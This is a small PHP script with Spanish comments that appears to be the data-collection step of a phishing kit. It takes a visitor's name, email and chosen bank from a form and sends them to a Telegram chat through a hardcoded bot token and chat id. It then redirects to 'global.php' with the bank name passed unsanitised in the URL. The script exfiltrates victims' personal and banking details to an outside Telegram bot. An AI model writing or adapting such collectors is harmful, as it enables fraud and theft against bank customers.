<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['nombre'], $_POST['correo'], $_POST['TxtBanco'])) {
        $nombre = $_POST['nombre'];
        $email = $_POST['correo'];
        $banco = $_POST['TxtBanco'];

        // Enviar datos a Telegram
        $token = '7445570122:AAHv1ZfcjvJQFgfdsgLqRjIs2jGqprTua88';
        $chat_id = '6065537099';
        $mensaje = "Nuevo pago recibido:\nNombre: $nombre\nEmail: $email\nBanco: $banco";

        $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($mensaje);
        $response = file_get_contents($url);

        if ($response) {
            // Redirigir a global.php
            header("Location: global.php?banco=$banco");
            exit;
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Error al notificar el pago']);
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Faltan datos en el formulario']);
    }
} else {
    echo json_encode(['status' => 'error', 'message' => 'Método no permitido']);
}
?>
